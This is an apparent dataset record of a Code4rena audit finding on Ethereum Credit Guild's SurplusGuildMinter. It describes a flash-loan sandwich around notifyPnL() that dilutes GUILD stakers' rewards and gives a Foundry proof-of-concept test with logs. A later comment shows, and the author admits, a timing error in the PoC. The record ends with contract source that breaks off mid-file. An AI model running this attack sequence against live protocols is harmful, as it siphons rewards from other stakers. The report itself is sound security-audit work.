{
  "Title": "[M-11] Malicious borrower can decrease Guild holders reward",
  "Content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L114-L155>\n\n<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L158-L212>\n\n<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L216-L290>\n\n### Impact\n\nA malicious borrower can reduce all Guild holders’ rewards with a big flashloan, upon full repayment.\n\nA borrower opens a loan with the minimum borrowable amount in term with no mandatory partial repayment. Waits for the loan to accumulate interest, then transfers the funds to an alternative account - EXPLOITER. EXPLOITER takes a flash loan, stakes the amount through `SurplusGuildMinter`, repays the original loan, lowering the rewards for all other GUILD holders by increasing the `_gaugeWeight` with his staked tokens. Afterward, the EXPLOITER unstakes and returns the flashloan.\n\nThe attacker ends up with his collateral, his loan repaid, credit reward and a big percentage of the reward intended for `GUILD` holders since he is the largest staker for this term at the time of the attack. He receives significant credit and guild rewards as a staker, which is incorrect because he was a staker only for that specific transaction.\n\nHe only pays the unavoidable interest payment, typically around `$4-5`, along with gas costs in the scenario described below.\n\n**Note:** The attack can be simplified further by having a substantial amount of tokens and bypassing the flashloan step. By frontrunning the `notifyPnL()` function with a `stake()`, followed by a backrun with an `unstake()`, this way the attacker can instantly accumulate rewards without being a long-term staker like others in the system.\n\n### Proof of Concept\n\nThe exploiter has two accounts:\n\n- **ALICE account:** This is used to borrow a loan, which the exploiter, will later repay to trigger the `notifyPnL()`.\n- **EXPLOITER account:** This account is used to obtain a flash loan, then staked the amount into the same term. This action is designed to deflate rewards for other participants in the system.\n\nPrerequisites: The exploiter requires approximately `$10` balance before the attack to cover the loan interest.\n\nHere are the detailed steps to execute the described attack:\n\n1. Alice borrows 100 gUSDC.\n2. Transfers the borrowed gUSDC to the EXPLOITER account.\n3. Waits for 150 days to accumulate interest on the loan (waiting period can also be shorter, for just 10 days the impact will be slightly lower, 4 decimals less removed from the stakers rewards).\n4. EXPLOITER obtains a USDC flash loan.\n5. Mints gUSDC through `PSM`.\n6. Stakes the minted gUSDC into the same term using `SurplusGuildMinter`.\n7. Repays Alice's position, triggering `notifyPnL()`.\n8. `notifyPnL()` updates the `_gaugeProfitIndex`, reducing rewards for other Guild holders.\n9. EXPLOITER unstakes.\n10. Redeems USDC through PSM.\n11. Returns the flash loan.\n\n### Coded PoC\n\nCreate new file in `test/unit/loan` called `DeflateGuildHoldersRewards.t.sol`:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.13;\n\nimport {Test, console} from \"@forge-std/Test.sol\";\nimport {Core} from \"@src/core/Core.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {MockLendingTerm} from \"@test/mock/MockLendingTerm.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\nimport {SurplusGuildMinter} from \"@src/loan/SurplusGuildMinter.sol\";\n\ncontract DeflateGuildHoldersRewardsUnitTest is Test {\n    address private governor = address(1);\n    address private guardian = address(2);\n    address private ALICE = makeAddr(\"alice\");\n    address private EXPLOITER = makeAddr(\"exploiter\");\n    address private STAKER1 = makeAddr(\"staker1\");\n    address private STAKER2 = makeAddr(\"staker2\");\n    address private STAKER3 = makeAddr(\"staker3\");\n    address private termUSDC;\n    Core private core;\n    ProfitManager private profitManagerUSDC;\n    CreditToken gUSDC;\n    GuildToken guild;\n    RateLimitedMinter rlgm;\n    SurplusGuildMinter sgmUSDC;\n\n    // GuildMinter params\n    uint256 constant MINT_RATIO = 2e18;\n    uint256 constant REWARD_RATIO = 5e18;\n\n    function setUp() public {\n        vm.warp(1679067867);\n        vm.roll(16848497);\n        core = new Core();\n\n        profitManagerUSDC = new ProfitManager(address(core));\n        gUSDC = new CreditToken(address(core), \"gUSDC\", \"gUSDC\");\n        guild = new GuildToken(address(core), address(profitManagerUSDC));\n        rlgm = new RateLimitedMinter(\n            address(core), /*_core*/\n            address(guild), /*_token*/\n            CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/\n            type(uint256).max, /*_maxRateLimitPerSecond*/\n            type(uint128).max, /*_rateLimitPerSecond*/\n            type(uint128).max /*_bufferCap*/\n        );\n        sgmUSDC = new SurplusGuildMinter(\n            address(core),\n            address(profitManagerUSDC),\n            address(gUSDC),\n            address(guild),\n            address(rlgm),\n            MINT_RATIO,\n            REWARD_RATIO\n        );\n        profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));\n        termUSDC = address(new MockLendingTerm(address(core)));\n\n        // roles\n        core.grantRole(CoreRoles.GOVERNOR, governor);\n        core.grantRole(CoreRoles.GUARDIAN, guardian);\n        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));\n        core.grantRole(CoreRoles.GUILD_MINTER, address(this));\n        core.grantRole(CoreRoles.GAUGE_ADD, address(this));\n        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));\n        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));\n        core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));\n        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));\n        core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));\n        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));\n        core.renounceRole(CoreRoles.GOVERNOR, address(this));\n\n        guild.setMaxGauges(10);\n        guild.addGauge(1, termUSDC);\n\n        // labels\n        vm.label(address(core), \"core\");\n        vm.label(address(profitManagerUSDC), \"profitManagerUSDC\");\n        vm.label(address(gUSDC), \"gUSDC\");\n        vm.label(address(guild), \"guild\");\n        vm.label(address(rlgm), \"rlcgm\");\n        vm.label(address(sgmUSDC), \"sgmUSDC\");\n        vm.label(termUSDC, \"termUSDC\");\n    }\n\n    function testGuildHoldersRewardsWithoutEXPLOITER() public {\n        // 3 users borrow gUSDC and stake them into the gUSDC term\n        // In reality there may be more users, but for testing purposes, three are sufficient.\n        gUSDC.mint(STAKER1, 200e18);\n        gUSDC.mint(STAKER2, 800e18);\n        gUSDC.mint(STAKER3, 600e18);\n\n        vm.startPrank(STAKER1);\n        gUSDC.approve(address(sgmUSDC), 200e18);\n        sgmUSDC.stake(termUSDC, 200e18);\n        vm.stopPrank();\n\n        vm.startPrank(STAKER2);\n        gUSDC.approve(address(sgmUSDC), 800e18);\n        sgmUSDC.stake(termUSDC, 800e18);\n        vm.stopPrank();\n\n        vm.startPrank(STAKER3);\n        gUSDC.approve(address(sgmUSDC), 600e18);\n        sgmUSDC.stake(termUSDC, 600e18);\n        vm.stopPrank();\n\n        // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.\n        uint borrowTime = block.timestamp;\n        gUSDC.mint(ALICE, 100e18);\n\n    \tvm.warp(block.timestamp + 150 days);\n        uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);\n        vm.prank(governor);\n        profitManagerUSDC.setProfitSharingConfig(\n            0.05e18, // surplusBufferSplit\n            0.9e18, // creditSplit\n            0.05e18, // guildSplit\n            0, // otherSplit\n            address(0) // otherRecipient\n        );\n\n        gUSDC.mint(address(profitManagerUSDC), interest);\n        profitManagerUSDC.notifyPnL(termUSDC, int256(interest));\n\n        sgmUSDC.getRewards(STAKER1, termUSDC);\n        sgmUSDC.getRewards(STAKER2, termUSDC);\n        sgmUSDC.getRewards(STAKER3, termUSDC);\n        console.log(\"------------------------------BEFORE ATTACK------------------------------\");\n        console.log(\"Staker1 credit reward:                                  \", gUSDC.balanceOf(address(STAKER1)));\n        console.log(\"Staker1 guild reward:                                  \", guild.balanceOf(address(STAKER1)));\n        console.log(\"Staker2 credit reward:                                 \", gUSDC.balanceOf(address(STAKER2)));\n        console.log(\"Staker2 guild reward:                                  \", guild.balanceOf(address(STAKER2)));\n        console.log(\"Staker3 credit reward:                                  \", gUSDC.balanceOf(address(STAKER3)));\n        console.log(\"Staker3 guild reward:                                  \", guild.balanceOf(address(STAKER3)));\n        console.log(\"GaugeProfitIndex:                                     \", profitManagerUSDC.gaugeProfitIndex(termUSDC));\n    }\n\n    function testGuildHoldersRewardsAfterEXPLOITER() public {\n        gUSDC.mint(STAKER1, 200e18);\n        gUSDC.mint(STAKER2, 800e18);\n        gUSDC.mint(STAKER3, 600e18);\n\n        vm.startPrank(STAKER1);\n        gUSDC.approve(address(sgmUSDC), 200e18);\n        sgmUSDC.stake(termUSDC, 200e18);\n        vm.stopPrank();\n\n        vm.startPrank(STAKER2);\n        gUSDC.approve(address(sgmUSDC), 800e18);\n        sgmUSDC.stake(termUSDC, 800e18);\n        vm.stopPrank();\n\n        vm.startPrank(STAKER3);\n        gUSDC.approve(address(sgmUSDC), 600e18);\n        sgmUSDC.stake(termUSDC, 600e18);\n        vm.stopPrank();\n\n        // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.\n        uint borrowTime = block.timestamp;\n        gUSDC.mint(ALICE, 100e18);\n\n        // NOTE: Alice needs to transfer the borrowed 100e18 gUSDC to EXPLOITER for repayment.\n\n        \n        console.log(\"-------------------------------AFTER ATTACK-------------------------------\");\n        console.log(\"EXPLOITER Credit Balance before flashloan:                              \", gUSDC.balanceOf(EXPLOITER));\n        // EXPLOITER gets a flashloan.\n        gUSDC.mint(EXPLOITER, 10_000_000e18);\n        console.log(\"EXPLOITER Credit Balance after flashloan:      \", gUSDC.balanceOf(EXPLOITER));\n        vm.startPrank(EXPLOITER);\n        gUSDC.approve(address(sgmUSDC), 10_000_000e18);\n        sgmUSDC.stake(termUSDC, 10_000_000e18);\n        console.log(\"EXPLOITER Credit balance after stake:                                   \", gUSDC.balanceOf(EXPLOITER));\n        vm.stopPrank();\n\n    \tvm.warp(block.timestamp + 150 days);\n        uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);\n        vm.prank(governor);\n        profitManagerUSDC.setProfitSharingConfig(\n            0.05e18, // surplusBufferSplit\n            0.9e18, // creditSplit\n            0.05e18, // guildSplit\n            0, // otherSplit\n            address(0) // otherRecipient\n        );\n\n        profitManagerUSDC.notifyPnL(termUSDC, int256(interest));\n        \n        sgmUSDC.getRewards(EXPLOITER, termUSDC);\n        console.log(\"EXPLOITER (instant) Credit reward:                     \", gUSDC.balanceOf(address(EXPLOITER)));\n        console.log(\"EXPLOITER (instant) Guild reward:                     \", guild.balanceOf(address(EXPLOITER)));\n        //EXPLOITER's profit is based on the guild split since he own almost all of the GUILD totalSupply.\n\n        vm.startPrank(EXPLOITER);\n        sgmUSDC.unstake(termUSDC, 10_000_000e18);\n        vm.stopPrank();\n\n        console.log(\"EXPLOITER credit balance after unstake:        \", gUSDC.balanceOf(EXPLOITER));\n\n        // NOTE: EXPLOITER repays the flash loan here.\n\n        sgmUSDC.getRewards(STAKER1, termUSDC);\n        sgmUSDC.getRewards(STAKER2, termUSDC);\n        sgmUSDC.getRewards(STAKER3, termUSDC);\n        console.log(\"Staker1 credit reward:                                      \", gUSDC.balanceOf(address(STAKER1)));\n        console.log(\"Staker1 guild reward:                                      \", guild.balanceOf(address(STAKER1)));\n        console.log(\"Staker2 credit reward:                                     \", gUSDC.balanceOf(address(STAKER2)));\n        console.log(\"Staker2 guild reward:                                      \", guild.balanceOf(address(STAKER2)));\n        console.log(\"Staker3 credit reward:                                     \", gUSDC.balanceOf(address(STAKER3)));\n        console.log(\"Staker3 guild reward:                                      \", guild.balanceOf(address(STAKER3)));\n        console.log(\"GaugeProfitIndex:                                     \", profitManagerUSDC.gaugeProfitIndex(termUSDC));\n    }\n\n    // Function that will compute Alice's interest with which notifyPnL will be called so that the attack is as accurate as possible\n    function _computeAliceLoanInterest(uint borrowTime, uint borrowAmount) private view returns (uint interest) {\n        uint256 _INTEREST_RATE = 0.10e18; // 10% APR --- from LendingTerm tests\n        uint256 YEAR = 31557600;\n\n        interest = (borrowAmount * _INTEREST_RATE * (block.timestamp - borrowTime)) / YEAR / 1e18;\n    }\n}\n```\n\n</details>\n\nThere are tests for both cases – one without the attack and another with the attack scenario.\n\nRun them with:\n\n```solidity\nforge test --match-contract \"DeflateGuildHoldersRewardsUnitTest\" --match-test \"testGuildHoldersRewards\" -vvv\n```\n\n```solidity\nLogs:\n  -------------------------------AFTER ATTACK-------------------------------\n  EXPLOITER Credit Balance before flashloan:                               0\n  EXPLOITER Credit Balance after flashloan:       10000000000000000000000000\n  EXPLOITER Credit balance after stake:                                    0\n  EXPLOITER (instant) Credit reward:                      205305960080000000\n  EXPLOITER (instant) Guild reward:                      1026529800400000000\n  EXPLOITER credit balance after unstake:         10000000205305960080000000\n  Staker1 credit reward:                                       4106119201600\n  Staker1 guild reward:                                       20530596008000\n  Staker2 credit reward:                                      16424476806400\n  Staker2 guild reward:                                       82122384032000\n  Staker3 credit reward:                                      12318357604800\n  Staker3 guild reward:                                       61591788024000\n  GaugeProfitIndex:                                      1000000010265298004\n\nLogs:\n  ------------------------------BEFORE ATTACK------------------------------\n  Staker1 credit reward:                                   25667351129363200\n  Staker1 guild reward:                                   128336755646816000\n  Staker2 credit reward:                                  102669404517452800\n  Staker2 guild reward:                                   513347022587264000\n  Staker3 credit reward:                                   77002053388089600\n  Staker3 guild reward:                                   385010266940448000\n  GaugeProfitIndex:                                      1000064168377823408\n```\n\n### Recommended Mitigation Steps\n\nProviding recommendations is challenging due to the large codebase, and code changes might affect other parts of the system.\n\nThe things we came up with to protect against this are to not allow staking and unstaking in the same block, implementing staking/unstaking fee, or implement a \"warm-up period\" during which stakers are unable to accumulate interest.\n\nWe are open to collaborate with the development team to find a proper mitigation for the problem.\n\n### Assessed type\n\nContext\n\n**[eswak (Ethereum Credit Guild) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994#issuecomment-1893474103):**\n > Thanks for the quality of the report. Confirming this but disagree with the severity, given the size of the impact: the split of interests going to GUILD holders is expected to be small (it is set to 1% in the deployment file). So for a loan that pays 4% APR, GUILD token holders will receive 0.04% of the principal in interests after 1 year. For a single loan, this amount is small and probably not worth the gas/time cost of coding/running a frontrunner, taking flashloans, etc.\n\n**[TrungOre (judge) decreased severity to Medium](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994#issuecomment-1910734867)**\n\n**[btk (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994#issuecomment-1924055726):**\n > How an exploiter can take a `$10` million USDC flashloan and then wait for 150 days? Aren't flashloans meant to be repaid in the same transaction? Also, in repaying Alice's position, the [repay()](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L629) function uses `msg.sender`.\n\n**[Slavcheww (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994#issuecomment-1924209054):**\n> I strongly advise you to read the report again, the Еxploiter never owns the flash loan for 150 days.\n> \n> > Also, in repaying Alice's position, the [repay()](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L629) function uses msg.sender.\n> \n> About that, yes there was a mistake in the steps, Alice will repay it, lowering all other rewards.\n> \n> This is a simpler sandwich attack.\n\n\n**[btk (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994#issuecomment-1924258512):**\n> @Slavcheww - I did review your PoC carefully, in your PoC you said that the attacker will take 10m flashloan here:\n> \n> ```solidity\n> gUSDC.mint(EXPLOITER, 10_000_000e18);\n> ```\n> \n> Following that, you used `warp` to warp 150 days before repaying the flashloan here:\n> \n> ```solidity\n> vm.warp(block.timestamp + 150 days);\n> uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);\n> ```\n> \n> Could you please explain how can the exploiter do that in a real world scenario?\n\n\n**[Slavcheww (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994#issuecomment-1924677821):**\n> @btk - I did review the PoC again, and yes, you are right. I made a mistake in where the blocks should pass, but even if they pass before the Exploiter takes the flashloan, the result is the same. Staking is based on staked amount, not time.\n> \n> Here's the fixed test, the Alice part can also be ignored because it's not used anywhere, I just forgot to remove it while writing the finding. Alice is not needed at all in the execution of the problem, Exploiter borrow, then wait, get the flashloan, stake, trigger `notifyPnL`, unstake, return the loan.\n> \n> https://gist.github.com/Slavchew/acff9a9c094d475b5d4806901eb61b64\n> \n> > Also, in repaying Alice's position, the [repay()](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L629) function uses `msg.sender`.\n> \n> Regarding above, the repay function uses `msg.sender`, but this is the repayer. As I mentioned, if you create the attack with 2 accounts like in the PoC steps, you need to transfer your credit tokens to the Exploiter to pay off your loan and trigger `notifyPnL()`.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-12-ethereumcreditguild",
  "Code": [
    {
      "filename": "src/loan/SurplusGuildMinter.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {SafeCastLib} from \"@src/external/solmate/SafeCastLib.sol\";\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\n\n/// @notice SurplusGuildMinter allows GUILD to be minted from CREDIT collateral.\n/// In this contract, CREDIT tokens can be provided as first-loss capital to\n/// the surplus buffer of chosen terms, and in exchange, users can participate in the\n/// gauge voting system at a reduced capital cost & without exposure to GUILD\n/// token's price fluctuations. GUILD minted through this contract can only\n/// participate in the gauge system to increase debt ceiling and earn fees\n/// from selected lending terms.\n/// @dev note that any update to the `rewardRatio` (through `setRewardRatio`) will\n/// change the rewards of all pending unclaimed rewards. Before a proposal to update\n/// the reward ratio execute, this contract should be pinged with `getRewards` for\n/// all users that have pending rewards.\ncontract SurplusGuildMinter is CoreRef {\n    /// @notice minimum number of CREDIT to stake\n    uint256 public constant MIN_STAKE = 1e18;\n\n    /// @notice reference number of seconds in 1 year\n    uint256 public constant YEAR = 31557600;\n\n    /// @notice emitted when a user stakes CREDIT on a target lending term\n    event Stake(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 amount\n    );\n    /// @notice emitted when a user unstakes CREDIT on a target lending term\n    event Unstake(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 amount\n    );\n    /// @notice emitted when a user is rewarded GUILD from non-zero interest\n    /// rate and closing their position without loss.\n    event GuildReward(\n        uint256 indexed timestamp,\n        address indexed user,\n        uint256 amount\n    );\n    /// @notice emitted when the mintRatio is updated\n    event MintRatioUpdate(uint256 indexed timestamp, uint256 ratio);\n    /// @notice emitted when the rewardRatio is updated\n    event RewardRatioUpdate(uint256 indexed timestamp, uint256 ratio);\n\n    /// @notice reference to the ProfitManager\n    address public immutable profitManager;\n\n    /// @notice reference to the CREDIT token\n    address public immutable credit;\n\n    /// @notice reference to the GUILD token\n    address public immutable guild;\n\n    /// @notice reference to the RateLimitedGuildMinter\n    address public immutable rlgm;\n\n    /// @notice ratio of GUILD tokens minted per CREDIT tokens staked.\n    /// expressed with 18 decimals, e.g. a ratio of 2e18 would provide 2e18\n    /// GUILD tokens to a user that stakes 1e18 CREDIT tokens.\n    uint256 public mintRatio;\n\n    /// @notice ratio of GUILD tokens earned per CREDIT tokens earned.\n    /// expressed with 18 decimals, e.g. a ratio of 2e18 would provide 2e18\n    /// GUILD tokens to a user that stakes earned 1e18 CREDIT tokens.\n    uint256 public rewardRatio;\n\n    struct UserStake {\n        uint48 stakeTime;\n        uint48 lastGaugeLoss;\n        uint160 profitIndex;\n        uint128 credit;\n        uint128 guild;\n    }\n\n    /// @notice list of user stakes (stakes[user][term]=UserStake)\n    mapping(address => mapping(address => UserStake)) internal _stakes;\n\n    constructor(\n        address _core,\n        address _profitManager,\n        address _credit,\n        address _guild,\n        address _rlgm,\n        uint256 _mintRatio,\n        uint256 _rewardRatio\n    ) CoreRef(_core) {\n        profitManager = _profitManager;\n        credit = _credit;\n        guild = _guild;\n        rlgm = _rlgm;\n        mintRatio = _mintRatio;\n        rewardRatio = _rewardRatio;\n    }\n\n    /// @notice get a given user stake\n    function getUserStake(\n        address user,\n        address term\n    ) external view returns (UserStake memory) {\n        return _stakes[user][term];\n    }\n\n    /// @notice stake CREDIT tokens to start voting in a gauge.\n    function stake(address term, uint256 amount) external whenNotPaused {\n        // apply pending rewards\n        (uint256 lastGaugeLoss, UserStake memory userStake, ) = getRewards(\n            msg.sender,\n            term\n        );\n\n        require(\n            lastGaugeLoss != block.timestamp,\n            \"SurplusGuildMinter: loss in block\"\n        );\n        require(amount >= MIN_STAKE, \"SurplusGuildMinter: min stake\");\n\n        // pull CREDIT from user & transfer it to surplus buffer\n        CreditToken(credit).transferFrom(msg.sender, address(this), amount);\n        CreditToken(credit).approve(address(profitManager), amount);\n        ProfitManager(profitManager).donateToTermSurplusBuffer(term, amount);\n\n        // self-mint GUILD tokens\n        uint256 _mintRatio = mintRatio;\n        uint256 guildAmount = (_mintRatio * amount) / 1e18;\n        RateLimitedMinter(rlgm).mint(address(this), guildAmount);\n        GuildToken(guild).incrementGauge(term, guildAmount);\n\n        // update state\n        userStake = UserStake({\n            stakeTime: SafeCastLib.safeCastTo48(block.timestamp),\n            lastGaugeLoss: SafeCastLib.safeCastTo48(lastGaugeLoss),\n            profitIndex: SafeCastLib.safeCastTo160(\n                ProfitManager(profitManager).userGaugeProfitIndex(\n                    address(this),\n                    term\n                )\n            ),\n            credit: userStake.credit + SafeCastLib.safeCastTo128(amount),\n            guild: userStake.guild + SafeCastLib.safeCastTo128(guildAmount)\n        });\n        _stakes[msg.sender][term] = userStake;\n\n        // emit event\n        emit Stake(block.timestamp, term, amount);\n    }\n\n    /// @notice unstake CREDIT tokens and stop voting in a gauge.\n    function unstake(address term, uint256 amount) external {\n        // apply pending rewards\n        (, UserStake memory userStake, bool slashed) = getRewards(\n            msg.sender,\n            term\n        );\n\n        // if the user has been slashed, there is nothing to do\n        if (slashed) return;\n\n        // check that the user is at least staking `amount` CREDIT\n        require(\n            amount != 0 && userStake.credit >= amount,\n            \"SurplusGuildMinter: invalid amount\"\n        );\n\n        // update stake\n        uint256 userMintRatio = (uint256(userStake.guild) * 1e18) /\n            userStake.credit; /// upcast guild to prevent overflow\n        uint256 guildAmount = (userMintRatio * amount) / 1e18;\n\n        if (amount == userStake.credit) guildAmount = userStake.guild;\n\n        userStake.credit -= SafeCastLib.safeCastTo128(amount);\n        userStake.guild -= SafeCastLib.safeCastTo128(guildAmount);\n\n        if (userStake.credit == 0) {\n            userStake.stakeTime = 0;\n            userStake.lastGaugeLoss = 0;\n            userStake.profitIndex = 0;\n        } else {\n            // if not unstaking all, make sure the stake remains\n            // greater than the minimum stake\n            require(\n                userStake.credit >= MIN_STAKE,\n                \"SurplusGuildMinter: remaining stake below min\"\n            );\n        }\n        _stakes[msg.sender][term] = userStake;\n\n        // withdraw & transfer CREDIT\n        ProfitManager(profitManager).withdrawFromTermSurplusBuffer(\n            term,\n            msg.sender,\n            amount\n        );\n\n        // burn GUILD\n        GuildToken(guild).decrementGauge(term, guildAmount);\n        RateLimitedMinter(rlgm).replenishBuffer(guildAmount);\n        GuildToken(guild).burn(guildAmount);\n\n        // emit event\n        emit Unstake(block.timestamp, term, amount);\n    }\n\n    /// @notice get rewards from a staking position without unstaking.\n    /// This can be used to slash users that have an outstanding unapplied loss.\n    function getRewards(\n        address user,\n        address term\n    )\n        public\n        returns (\n            uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)\n            UserStake memory userStake, // stake state after execution of getRewards()\n            bool slashed // true if the user has been slashed\n        )\n    {\n        bool updateState;\n        lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);\n        if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) {\n            slashed = true;\n        }\n\n        // if the user is not staking, do nothing\n        userStake = _stakes[user][term];\n        if (userStake.stakeTime == 0)\n            return (lastGaugeLoss, userStake, slashed);\n\n        // compute CREDIT rewards\n        ProfitManager(profitManager).claimRewards(address(this)); // this will update profit indexes\n        uint256 _profitIndex = ProfitManager(profitManager)\n            .userGaugeProfitIndex(address(this), term);\n        uint256 _userProfitIndex = uint256(userStake.profitIndex);\n\n        if (_profitIndex == 0) _profitIndex = 1e18;\n        if (_userProfitIndex == 0) _userProfitIndex = 1e18;\n\n        uint256 deltaIndex = _profitIndex - _userProfitIndex;\n\n        if (deltaIndex != 0) {\n            uint256 creditReward = (uint256(userStake.guild) * deltaIndex) /\n                1e18;\n            uint256 guildReward = (creditReward * rewardRatio) / 1e18;\n            if (slashed) {\n                guildReward = 0;\n            }\n\n            // forward rewards to user\n            if (guildReward != 0) {\n                RateLimitedMinter(rlgm).mint(user, guildReward);\n                emit GuildReward(block.timestamp, user, guildReward);\n            }\n            if (creditReward != 0) {\n                CreditToken(credit).transfer(user, creditReward);\n            }\n\n            // save the updated profitIndex\n            userStake.profitIndex = SafeCastLib.safeCastTo160(_profitIndex);\n            updateState = true;\n        }\n\n        // if a loss occurred while the user was staking, the GuildToken.applyGaugeLoss(address(this))\n        // can be called by anyone to slash address(this) and decrement gauge weight etc.\n        // The contribution to the surplus buffer is also forfeited.\n        if (slashed) {\n            emit Unstake(block.timestamp, term, uint256(userStake.credit));\n            userStake = UserStake({\n                stakeTime: uint48(0),\n                lastGaugeLoss: uint48(0),\n                profitIndex: uint160(0),\n                credit: uint128(0),\n                guild: uint128(0)\n            });\n            updateState = true;\n        }\n\n        // store the updated stake, if needed\n        if (updateState) {\n            _stakes[user][term] = userStake;\n        }\n    }\n\n    /// @notice update the mint ratio for a given user.\n    function updateMintRatio(address user, address term) external {\n        // apply pending rewards\n        (, UserStake memory userStake, bool slashed) = getRewards(user, term);\n\n        // if the user has been slashed or isnt staking, there is nothing to do\n        if (userStake.stakeTime == 0 || slashed) return;\n\n        // update amount of GUILD tokens staked\n        uint256 guildBefore = uint256(userStake.guild);\n        uint256 guildAfter = (mintRatio * uint256(userStake.credit)) / 1e18;\n        if (guildAfter > guildBefore) {\n            uint256 guildAmount = guildAfter - guildBefore;\n            RateLimitedMinter(rlgm).mint(address(this), guildAmount);\n            GuildToken(guild).incrementGauge(term, guildAmount);\n            _stakes[user][term].guild = SafeCastLib.safeCastTo128(guildAfter);\n        } else if (guildAfter < guildBefore) {\n            uint256 guildAmount = guildBefore - guildAfter;\n            GuildToken(guild).decrementGauge(term, guildAmount);\n            RateLimitedMinter(rlgm).replenishBuffer(guildAmount);\n            GuildToken(guild).burn(guildAmount);\n            _stakes[user][term].guild = SafeCastLib.safeCastTo128(guildAfter);\n        }\n    }\n\n    /// @notice governor-only function to set the ratio of GUILD tokens minted\n    /// per CREDIT tokens contributed to the surplus buffer.\n    function setMintRatio(\n        uint256 _mintRatio\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        mintRatio = _mintRatio;\n        emit MintRatioUpdate(block.timestamp, _mintRatio);\n    }\n\n    /// @notice governor-only function to set the ratio of GUILD tokens rewarded\n    /// per CREDIT tokens earned from GUILD staking.\n    function setRewardRatio(\n        uint256 _rewardRatio\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        rewardRatio = _rewardRatio;\n        emit RewardRatioUpdate(block.timestamp, _rewardRatio);\n    }\n}"
    },
    {
      "filename": "src/loan/SurplusGuildMinter.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {SafeCastLib} from \"@src/external/solmate/SafeCastLib.sol\";\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\n\n/// @notice SurplusGuildMinter allows GUILD to be minted from CREDIT collateral.\n/// In this contract, CREDIT tokens can be provided as first-loss capital to\n/// the surplus buffer of chosen terms, and in exchange, users can participate in the\n/// gauge voting system at a reduced capital cost & without exposure to GUILD\n/// token's price fluctuations. GUILD minted through this contract can only\n/// participate in the gauge system to increase debt ceiling and earn fees\n/// from selected lending terms.\n/// @dev note that any update to the `rewardRatio` (through `setRewardRatio`) will\n/// change the rewards of all pending unclaimed rewards. Before a proposal to update\n/// the reward ratio execute, this contract should be pinged with `getRewards` for\n/// all users that have pending rewards.\ncontract SurplusGuildMinter is CoreRef {\n    /// @notice minimum number of CREDIT to stake\n    uint256 public constant MIN_STAKE = 1e18;\n\n    /// @notice reference number of seconds in 1 year\n    uint256 public constant YEAR = 31557600;\n\n    /// @notice emitted when a user stakes CREDIT on a target lending term\n    event Stake(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 amount\n    );\n    /// @notice emitted when a user unstakes CREDIT on a target lending term\n    event 